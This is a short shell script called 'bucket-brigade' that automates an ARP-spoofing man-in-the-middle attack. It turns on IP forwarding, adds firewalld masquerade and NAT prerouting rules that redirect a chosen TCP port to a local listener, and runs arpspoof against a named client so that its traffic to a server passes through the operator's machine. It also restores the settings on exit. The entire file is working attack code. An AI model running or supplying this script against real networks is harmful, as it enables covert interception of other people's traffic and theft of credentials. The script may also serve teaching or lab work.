#
#   Copyright (C) 2018 -- 2023  Zachary A. Kissel
#
#   This program is free software: you can redistribute it and/or modify
#   it under the terms of the GNU General Public License as published by
#   the Free Software Foundation, either version 3 of the License, or
#   (at your option) any later version.
#
#   This program is distributed in the hope that it will be useful,
#   but WITHOUT ANY WARRANTY; without even the implied warranty of
#   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#   GNU General Public License for more details.
#
#   You should have received a copy of the GNU General Public License
#   along with this program.  If not, see <https://www.gnu.org/licenses/>.
#
#!/bin/sh

IFACE=wlp2s0

usage()
{
  echo "Usage: bucket-brigade <client> <server> <src_port> <dest_port>"
  exit 1
}

cleanup()
{
  echo "*** Cleaning up ***"
  echo
  echo $old_ip_fwd_val > /proc/sys/net/ipv4/ip_forward
  echo "IPv4 forwarding configuration restored."

  # restore the firewall configuration by reloading it.
  firewall-cmd --reload &> /dev/null
  echo "Firewall configuration restored."

  # Kill all running instances of arpspoof.
  pkill arpspoof > /dev/null
  echo "ARP spoofing terminated."
}

ctrl_c()
{
  cleanup
}

check_required()
{
	which arpspoof &> /dev/null

	if [ $? -ne 0 ]; then
		echo "Error: arpspoof not installed."
		exit 1
	fi
}

# Print the usage message if we don't have the correct number of
# arguments.
if [ $# -ne 4 ]; then
  usage
fi

# Make sure we are running as root -- we need to be root to make the necessary
# changes to the network stack.
uid=`id -u`
if [ $uid -ne 0 ]; then
  echo "Must be root to run this script."
  exit 1
fi

# Check to make sure the required tools are installed.
check_required

# Turn on IPv4 packet forwarding to make ourselves invisible to our target.# Make sure we save off the original value so we can properly restor our
# configuration.
old_ip_fwd_val=`cat /proc/sys/net/ipv4/ip_forward`
echo 1 > /proc/sys/net/ipv4/ip_forward

# Turn on ip masquerading in the defualt zone.
#
zone=`firewall-cmd --get-default-zone`
firewall-cmd --zone=$zone --add-masquerade

#
# Turn on port forwarding in the default zone. Basically, we rewrite any
# packet ment for our interface and apply a NAT prerouting rule. The NAT rule
# allows us to rewrite the stolen packet's port so that it is redirected to
# our program listening on port <dest_port>
#
firewall-cmd --zone=$zone --direct --passthrough ipv4 -A FORWARD --in-interface $IFACE -j ACCEPT
firewall-cmd --zone=$zone --direct --passthrough ipv4 -t nat -A PREROUTING -i $IFACE -p tcp --dport $3 -j REDIRECT --to-port=$4
firewall-cmd --zone=$zone --list-all

# Install a new trap handler. This signal handler must be installed no earlier
# otherwise we can not guarantee that the ip_forwarding has been affected.
trap ctrl_c INT EXIT

# Let the heavly lifting be done now by arpspoof(8).
arpspoof -t $1 $2 &> /dev/null &
if [ $? -ne 0 ]; then
  echo "Could not set up spoofing ${1} -> ${2}."
  cleanup
  exit 1
fi

# Let the user know that they are now a man-in-the-middle.
echo
echo "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
echo "!!                                     !!"
echo "!!           Bucket Brigade            !!"
echo "!!                                     !!"
echo "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
echo
echo "Traffic: ${1} ----> (This Computer) ----> ${2}"
echo

# At this point, we are a man in the middle. Present the operator with
# a message to handle if they wish to quit or not.
ans='n'
while [ $ans != "q" ]; do
  echo "Please enter q to quit."
  read ans
done
echo  # print a blank line.
cleanup # we're done; cleanup.
